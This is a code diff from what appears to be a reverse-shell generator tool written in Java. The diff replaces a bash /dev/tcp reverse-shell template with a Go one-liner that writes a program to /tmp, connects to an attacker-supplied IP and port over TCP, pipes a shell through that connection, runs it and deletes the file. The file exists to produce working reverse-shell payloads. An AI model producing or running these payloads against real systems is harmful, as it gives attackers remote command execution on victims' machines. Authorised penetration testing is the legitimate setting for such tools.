@@ -2,14 +2,13 @@ package com.iteso.ReverseShellGenerator.Reverse.Shells;
 import com.iteso.ReverseShellGenerator.DEncoder;
 import com.iteso.ReverseShellGenerator.Reverse.Reverse;
 
-
-public class Bash_readline extends Reverse{
+public class Golang extends Reverse {
 
     protected String shellFormat = "";
 
-    public Bash_readline(String localIP, int localPort, LISTENER listener, SHELLS shellType){
+    public Golang(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done", this.getLocalIP(),this.getLocalPort());
+        shellFormat = String.format("echo 'package main;import\\\"os/exec\\\";import\\\"net\\\";func main(){c,_:=net.Dial(\\\"tcp\\\",\\\"%s:%s\\\");cmd:=exec.Command(\\\"%s\\\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go", this.getLocalIP(), this.getLocalPort(), this.getShell());
     }
 
     @Override
@@ -26,4 +25,5 @@ public class Bash_readline extends Reverse{
                     "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                 "}";
     }
+ 
 }
